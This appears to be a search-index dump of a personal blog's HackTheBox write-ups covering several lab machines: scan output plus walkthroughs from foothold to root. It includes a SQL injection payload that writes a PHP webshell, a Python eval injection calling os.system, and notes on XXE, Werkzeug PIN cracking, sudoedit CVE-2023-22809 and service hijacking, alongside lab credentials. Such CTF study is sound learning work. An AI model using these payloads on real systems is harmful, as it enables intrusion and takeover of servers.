submit form When we click submit, we see that the ip is the only parameter sent If we try changing ip to our address and listen with nc on port 389, we receive the printer creds return\\svc-printer:1edFg43012!! We have a connection via winrm Root Let\u0026rsquo;s enumerate via winpeas According to winpeas the user is in Server Operator group The group can start and stop services If we follow the post we are successfuly get root We modify the service by changing binary path and restart it to get reverse shell ","date":"August 8, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/return/images/return.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/return/","summary":"Return Enumeration nmap â””â”€$ nmap -p- -Pn 10.10.11.108 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 16:41 BST Stats: 0:05:48 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 62.24% done; ETC: 16:50 (0:03:31 remaining) Warning: 10.10.11.108 giving up on port because retransmission cap hit (6). Stats: 0:14:43 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 99.03% done; ETC: 16:56 (0:00:09 remaining) Nmap scan report for 10.","tags":["HTB","printer","ldap","evil-winrm","server-operators","service","service-hijack","windows-service"],"title":"[HTB] Machine: Return"},{"categories":null,"contents":"Validation Enumeration nmap â””â”€$ nmap -p- -Pn 10.10.11.116 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 17:09 BST Nmap scan report for 10.10.11.116 (10.10.11.116) Host is up (0.14s latency). Not shown: 65522 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 4566/tcp open kwtc 5000/tcp filtered upnp 5001/tcp filtered commplex-link 5002/tcp filtered rfe 5003/tcp filtered filemaker 5004/tcp filtered avt-profile-1 5005/tcp filtered avt-profile-2 5006/tcp filtered wsm-server 5007/tcp filtered wsm-server-ssl 5008/tcp filtered synapsis-edge 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 583.51 seconds â””â”€$ nmap -sC -sV -Pn -p22,80,4566,8080 10.10.11.116 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 17:23 BST Nmap scan report for 10.10.11.116 (10.10.11.116) Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA) | 256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA) |_ 256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519) 80/tcp open http Apache httpd 2.4.48 ((Debian)) |_http-server-header: Apache/2.4.48 (Debian) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). 4566/tcp open http nginx |_http-title: 403 Forbidden 8080/tcp open http nginx |_http-title: 502 Bad Gateway Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.96 seconds gobuster â””â”€$ gobuster dir -u http://10.10.11.116/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.116/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/08/10 17:38:19 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 16088] /account.php (Status: 200) [Size: 16] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.11.116/css/] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.11.116/js/] /config.php (Status: 200) [Size: 0] Web Server Foothold/User When we fill in the form, we get the following result Let\u0026rsquo;s start with SQLI No issues with Test123' But when I tried special chars with country params, the backend issued error Looks like second-order SQLI - Second-order SQL injection arises when user-supplied data is stored by the application and later incorporated into SQL queries in an unsafe way. https://portswigger.net/kb/issues/00100210_sql-injection-second-order https://offensive360.com/second-order-sql-injection-attack/ By the way, we have to use the cookie that\u0026rsquo;s being sent to us to see the error It\u0026rsquo;s md5 hash of the username we registered I played around with different payloads and had success with username=TEST\u0026amp;country=USA' union select 1;-- - The query username=TEST\u0026amp;country=USA' union select user();-- - resulted in Since now we can execute different queries, let\u0026rsquo;s enumerate username=TEST\u0026amp;country=USA' union select database();-- - - registration username=TEST\u0026amp;country=USA' union select column_name from information_schema.columns where table_name = 'registration' - shows username, userhash, country, regtime No entries with password If we execute username=TEST\u0026amp;country=USA' union select privilege_type FROM information_schema.user_privileges where grantee = \u0026quot;'uhc'@'localhost'\u0026quot;;-- -, we have FILE privileges We can create a File https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#mysql-commands Let\u0026rsquo;s test it username=TEST\u0026amp;country=USA' union select \u0026quot;PENTEST!!!\u0026quot; into outfile '/var/www/html/PENTEST.txt';-- - Don\u0026rsquo;t forget to visit account.php with the cookie that was sent back Let\u0026rsquo;s create webshell username=TEST\u0026amp;country=USA' union select \u0026quot;\u0026lt;?php SYSTEM($_REQUEST['cmd']); ?\u0026gt;\u0026quot; into outfile '/var/www/html/cmd.php';-- - Reverse shell I didn\u0026rsquo;t know that there is another way of upgrading shell script /dev/null -c bash The rest is the same Root Enumeration resulted in config.php file Let\u0026rsquo;s try su - Rooted ","date":"August 8, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/validation/images/validation.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/validation/","summary":"Validation Enumeration nmap â””â”€$ nmap -p- -Pn 10.10.11.116 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 17:09 BST Nmap scan report for 10.10.11.116 (10.10.11.116) Host is up (0.14s latency). Not shown: 65522 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 4566/tcp open kwtc 5000/tcp filtered upnp 5001/tcp filtered commplex-link 5002/tcp filtered rfe 5003/tcp filtered filemaker 5004/tcp filtered avt-profile-1 5005/tcp filtered avt-profile-2 5006/tcp filtered wsm-server 5007/tcp filtered wsm-server-ssl 5008/tcp filtered synapsis-edge 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 583.","tags":["HTB","cookies","sqli injection","second-order-sqli","sqli-file","webshell"],"title":"[HTB] Machine: Validation"},{"categories":null,"contents":"Agile Enumeration nmap â””â”€$ nmap -Pn -p22,80,7352,12249,13006,15172,26869,28151,34525,34972,37863,40486,49272,63692 -sC -sV 10.10.11.203 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 15:31 EDT Nmap scan report for 10.10.11.203 (10.10.11.203) Host is up (0.18s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA) |_ 256 65c1480d88cbb975a02ca5e6377e5106 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://superpass.htb |_http-server-header: nginx/1.18.0 (Ubuntu) 7352/tcp closed swx 12249/tcp closed unknown 13006/tcp closed unknown 15172/tcp closed unknown 26869/tcp closed unknown 28151/tcp closed unknown 34525/tcp closed unknown 34972/tcp closed unknown 37863/tcp closed unknown 40486/tcp closed unknown 49272/tcp closed unknown 63692/tcp closed unknown Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.44 seconds gobuster â””â”€$ gobuster dir -u http://superpass.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://superpass.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/05/20 15:33:55 Starting gobuster in directory enumeration mode =============================================================== /download (Status: 302) [Size: 249] [--\u0026gt; /account/login?next=%2Fdownload] /static (Status: 301) [Size: 178] [--\u0026gt; http://superpass.htb/static/] /vault (Status: 302) [Size: 243] [--\u0026gt; /account/login?next=%2Fvault] Web server Foothold I created a user and was redirected to /vault Added a password, saved it and clicked export I intercepted the request in Burp and played with it While playing around with /vault route, the error popped up It indicated the backend tech used: flask and mysql It looks like the debug console is enabled and I tried opening it, but it\u0026rsquo;s protected with pin We know it\u0026rsquo;s a flask application And I finally managed to get an lfi by playing around with payloads I was stuck here for a while I couldn\u0026rsquo;t find anything useful, except config_prod.json file, which was retrieved via from /proc/self/environ mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass But then I remembered about the pin and debug console The following post has all the information we need to crack the pin https://www.bengrewell.com/cracking-flask-werkzeug-console-pin/ So I basically try replicating the steps I started gathering all the data I needed from box using lfi After filling in required info, I ran the script And we have successfully cracked the pin Now let\u0026rsquo;s get rce And we have our foothold User #1 Enumerate the box as usual, but I had mysql creds from before I checked the database and found creds for another user corum:5db7caa1d13cc37c9fc2 Now we can ssh User #2 We have another vhost But it\u0026rsquo;s available locally server { listen 127.0.0.1:80; server_name test.superpass.htb; location /static { alias /app/app-testing/superpass/static; expires 365d; } location / { include uwsgi_params; proxy_pass http://127.0.0.1:5555; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-Protocol $scheme; } } If we check /app, we have app-testing Inside we creds.txt, but it\u0026rsquo;s not readable By the way, linpeas also showed chromedriver running in the process list If we check test_site_interactively.py in /app/app-testing/tests/functional, we can see it uses creds.txt It uses selenium to load the site corum@agile:/app$ ls -l total 24 drwxr-xr-x 5 corum runner 4096 Jan 23 21:50 app drwxr-xr-x 8 runner runner 4096 Jan 25 17:29 app-testing -r--r----- 1 dev_admin www-data 88 Jan 25 00:00 config_prod.json -r--r----- 1 dev_admin runner 99 Jan 25 15:15 config_test.json -rwxr-xr-x 1 root runner 557 Jan 25 17:36 test_and_update.sh drwxrwxr-x 5 root dev_admin 4096 Jan 25 17:21 venv So googling resulted in a nice post Now we need to setup a forwarding And open chrome chrome://inspect and devices page Add new port in via Configure, which will set up a new remote target device localhost:41829 Click inspect And we get our creds: edwards:d07867c6267dcb5df0af ssh as edwards Root Nothing on mysql using creds: mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest But we have sudo rights for sudoedit https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudoedit-privilege-escalation/ We remember a test_and_update.sh in /app directory It had a hint # system-wide source doesn't seem to happen in cron jobs So if we check $PATH, we find that each shell is running with python virtual environment corum@agile:~$ echo $PATH /app/venv/bin:/app/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin edwards@agile:~$ tail -2 /etc/bash.bashrc # all users will want the env associated with this application source /app/venv/bin/activate If we monitor pspy we see that root periodically logs in And each time it will source /app/venv/bin/activate So we can modify a /app/venv/bin/activate via CVE-2023-22809 https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudoedit-privilege-escalation/ And wait for execution ","date":"August 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/agile/images/agile.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/agile/","summary":"Agile Enumeration nmap â””â”€$ nmap -Pn -p22,80,7352,12249,13006,15172,26869,28151,34525,34972,37863,40486,49272,63692 -sC -sV 10.10.11.203 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 15:31 EDT Nmap scan report for 10.10.11.203 (10.10.11.203) Host is up (0.18s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA) |_ 256 65c1480d88cbb975a02ca5e6377e5106 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://superpass.htb |_http-server-header: nginx/1.","tags":["HTB","flask","python","file-read","werkzeug","werkzeug-debug","flask-debug-pin","python-venv","selenium","chrome","chrome-debug","sudoedit","cve-2023-22809"],"title":"[HTB] Machine: Agile"},{"categories":null,"contents":"Armageddon Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.233 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-07 17:41 BST Nmap scan report for 10.10.10.233 (10.10.10.233) Host is up (0.18s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA) | 256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA) |_ 256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) | http-robots.txt: 36 disallowed entries (15 shown) | /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 |_http-generator: Drupal 7 (http://drupal.org) |_http-title: Welcome to Armageddon | Armageddon Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 33.20 seconds gobuster â””â”€$ gobuster dir -u http://10.10.10.233 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php -no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.233 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,php [+] No status: true [+] Timeout: 10s =============================================================== 2023/08/07 18:29:26 Starting gobuster in directory enumeration mode =============================================================== /index.php [Size: 7440] /misc [Size: 233] [--\u0026gt; http://10.10.10.233/misc/] /themes [Size: 235] [--\u0026gt; http://10.10.10.233/themes/] /modules [Size: 236] [--\u0026gt; http://10.10.10.233/modules/] /scripts [Size: 236] [--\u0026gt; http://10.10.10.233/scripts/] /sites [Size: 234] [--\u0026gt; http://10.10.10.233/sites/] /includes [Size: 237] [--\u0026gt; http://10.10.10.233/includes/] /install.php [Size: 3172] /profiles [Size: 237] [--\u0026gt; http://10.10.10.233/profiles/] /update.php [Size: 4057] /README.txt [Size: 5382] /robots.txt [Size: 2189] /cron.php [Size: 7388] /INSTALL.txt [Size: 17995] /LICENSE.txt [Size: 18092] /CHANGELOG.txt [Size: 111613] /xmlrpc.php [Size: 42] /COPYRIGHT.txt [Size: 1481] Web Server We see Drupal 7 Foothold Drupal version and searchsploit We have drupalgeddon3 and drupalgeddon2 Let\u0026rsquo;s start with drupalgeddon2 There is a github post Got reverse shell, but couldn\u0026rsquo;t upgrade the shell User Enumerate users bash-4.2$ cat /etc/passwd rootâŒ0:0:root:/root:/bin/bash binâŒ1:1:bin:/bin:/sbin/nologin daemonâŒ2:2:daemon:/sbin:/sbin/nologin admâŒ3:4:adm:/var/adm:/sbin/nologin lpâŒ4:7:lp:/var/spool/lpd:/sbin/nologin syncâŒ5:0:sync:/sbin:/bin/sync shutdownâŒ6:0:shutdown:/sbin:/sbin/shutdown haltâŒ7:0:halt:/sbin:/sbin/halt mailâŒ8:12:mail:/var/spool/mail:/sbin/nologin operatorâŒ11:0:operator:/root:/sbin/nologin gamesâŒ12ðŸ’¯games:/usr/games:/sbin/nologin ftpâŒ14:50:FTP User:/var/ftp:/sbin/nologin nobodyâŒ99:99:Nobody:/:/sbin/nologin systemd-networkâŒ192:192:systemd Network Management:/:/sbin/nologin dbusâŒ81:81:System message bus:/:/sbin/nologin polkitdâŒ999:998:User for polkitd:/:/sbin/nologin sshdâŒ74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin postfixâŒ89:89::/var/spool/postfix:/sbin/nologin apacheâŒ48:48:Apache:/usr/share/httpd:/sbin/nologin mysqlâŒ27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin brucetherealadminâŒ1000:1000::/home/brucetherealadmin:/bin/bash grep -irln \u0026quot;password\u0026quot; . in /var/www/html We see ./sites/default/settings.php drupaluser:CQHEy@9M*m23gBVj Since these are mysql creds, let\u0026rsquo;s check db I have to run db commands from cmd, since I don\u0026rsquo;t have PTY bash-4.2$ mysql -u drupaluser -p\u0026#39;CQHEy@9M*m23gBVj\u0026#39; drupal -e \u0026#39;show tables;\u0026#39; mysql -u drupaluser -p\u0026#39;CQHEy@9M*m23gBVj\u0026#39; drupal -e \u0026#39;show tables;\u0026#39; Tables_in_drupal actions authmap batch ... users users_roles variable watchdog bash-4.2$ mysql -u drupaluser -p\u0026#39;CQHEy@9M*m23gBVj\u0026#39; drupal -e \u0026#39;select * from users;\u0026#39; \u0026lt;er -p\u0026#39;CQHEy@9M*m23gBVj\u0026#39; drupal -e \u0026#39;select * from users;\u0026#39; uid name pass mail theme signature signature_format created access login status timezone language picture init data 0 NULL 0 0 0 0 NULL 0 NULL 1 brucetherealadmin $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu filtered_html 1606998756 1607077194 1607076276 1 Europe/London 0 admin@armageddon.eu a:1:{s:7:\u0026#34;overlay\u0026#34;;i:1;} Let\u0026rsquo;s crack the hash with hashcat $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt hashcat -m 7900 hash /usr/share/wordlists/rockyou.txt brucetherealadmin:booboo ssh as brucetherealadmin Root Enumerate sudo rights GTFOBins So I found this post which crafts malicious snap package The payload is from [this] dirtysock poc Let\u0026rsquo;s run sudo according to GTFOBins with our malicious package and get root ","date":"August 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/armageddon/images/armageddon.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/armageddon/","summary":"Armageddon Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.233 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-07 17:41 BST Nmap scan report for 10.10.10.233 (10.10.10.233) Host is up (0.18s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA) | 256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA) |_ 256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) | http-robots.","tags":["HTB","drupal","webshell","upload","hashcat","mysql","sudo","snap","snapcraft"],"title":"[HTB] Machine: Armageddon"},{"categories":null,"contents":"BountyHunter Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.11.100 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-07 15:22 BST Nmap scan report for 10.10.11.100 (10.10.11.100) Host is up (0.18s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA) | 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA) |_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Bounty Hunters |_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.17 seconds gobuster â””â”€$ gobuster dir -u http://10.10.11.100/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.100/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,php [+] Timeout: 10s =============================================================== 2023/08/07 15:32:18 Starting gobuster in directory enumeration mode =============================================================== /resources (Status: 301) [Size: 316] [--\u0026gt; http://10.10.11.100/resources/] /assets (Status: 301) [Size: 313] [--\u0026gt; http://10.10.11.100/assets/] /.php (Status: 403) [Size: 277] /index.php (Status: 200) [Size: 25169] /portal.php (Status: 200) [Size: 125] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.11.100/css/] /db.php (Status: 200) [Size: 0] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.11.100/js/] Web Server Foothold/User If we visit /portal.php We see that it redirects us to /log_submit.php When we submit report from /log_submit.php, the POST request is sent to /tracker_diRbPr00f314.php the data is base64 encoded xml We can test for XXE And it works Now we can try looking for creds We can load php files and analyse the source code I remembered db.php file from gobuster results Since it\u0026rsquo;s php file we need to wrap php file around filter, or it will return empty Check the post admin:m19RoAU0hP41A1sTsq6K Use creds for ssh There is no admin user, but we have development user The creds work Root Enumerate sudo rights If we check source code We can use eval function by inserting values to ticket Example of ticket development@bountyhunter:/opt/skytrain_inc/invalid_tickets$ cat 390681613.md # Skytrain Inc ## Ticket to New Haven __Ticket Code:__ **31+410+86** ##Issued: 2021/04/06 #End Ticket We can copy and modify valid ticket add payload between ** The first int should satisfy if int(ticketCode) % 7 == 4: Payload: 32+110+43+ __import__('os').system('bash') ","date":"August 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/bountyhunter/images/bountyhunter.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/bountyhunter/","summary":"BountyHunter Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.11.100 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-07 15:22 BST Nmap scan report for 10.10.11.100 (10.10.11.100) Host is up (0.18s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA) | 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA) |_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB","xxe","python-eval","command-injection"],"title":"[HTB] Machine: BountyHunter"},{"categories":null,"contents":"Cap Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.245 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-06 13:25 BST Nmap scan report for 10.10.10.245 (10.10.10.245) Host is up (0.11s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA) | 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA) |_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8dðŸ‡©ðŸ‡ªb3ðŸ‡©ðŸ‡ªb2:18 (ED25519) 80/tcp open http gunicorn |_http-title: Security Dashboard | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 404 NOT FOUND | Server: gunicorn | Date: Sun, 06 Aug 2023 12:35:52 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 232 | \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//W3C//DTD HTML 3.2 Final//EN\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;404 Not Found\u0026lt;/title\u0026gt; | \u0026lt;h1\u0026gt;Not Found\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.\u0026lt;/p\u0026gt; | GetRequest: | HTTP/1.0 200 OK | Server: gunicorn | Date: Sun, 06 Aug 2023 12:35:46 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 19386 | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html class=\u0026#34;no-js\u0026#34; lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;x-ua-compatible\u0026#34; content=\u0026#34;ie=edge\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Security Dashboard\u0026lt;/title\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; type=\u0026#34;image/png\u0026#34; href=\u0026#34;/static/images/icon/favicon.ico\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/bootstrap.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/font-awesome.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/themify-icons.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/metisMenu.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/owl.carousel.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/slicknav.min.css\u0026#34;\u0026gt; | \u0026lt;!-- amchar | HTTPOptions: | HTTP/1.0 200 OK | Server: gunicorn | Date: Sun, 06 Aug 2023 12:35:46 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Allow: OPTIONS, GET, HEAD | Content-Length: 0 | RTSPRequest: | HTTP/1.1 400 Bad Request | Connection: close | Content-Type: text/html | Content-Length: 196 | \u0026lt;html\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;title\u0026gt;Bad Request\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;h1\u0026gt;\u0026lt;p\u0026gt;Bad Request\u0026lt;/p\u0026gt;\u0026lt;/h1\u0026gt; | Invalid HTTP Version \u0026amp;#x27;Invalid HTTP Version: \u0026amp;#x27;RTSP/1.0\u0026amp;#x27;\u0026amp;#x27; | \u0026lt;/body\u0026gt; |_ \u0026lt;/html\u0026gt; |_http-server-header: gunicorn 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port80-TCP:V=7.94%I=7%D=8/6%Time=64CF93C4%P=x86_64-pc-linux-gnu%r(GetRe SF:quest,1026,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x20S SF:un,\\x2006\\x20Aug\\x202023\\x2012:35:46\\x20GMT\\r\\nConnection:\\x20close\\r\\n SF:Content-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x201938 SF:6\\r\\n\\r\\n\u0026lt;!DOCTYPE\\x20html\u0026gt;\\n\u0026lt;html\\x20class=\\\u0026#34;no-js\\\u0026#34;\\x20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\\n SF:\\n\u0026lt;head\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20 SF:\u0026lt;meta\\x20http-equiv=\\\u0026#34;x-ua-compatible\\\u0026#34;\\x20content=\\\u0026#34;ie=edge\\\u0026#34;\u0026gt;\\n\\x20\\x SF:20\\x20\\x20\u0026lt;title\u0026gt;Security\\x20Dashboard\u0026lt;/title\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x SF:20name=\\\u0026#34;viewport\\\u0026#34;\\x20content=\\\u0026#34;width=device-width,\\x20initial-scale=1 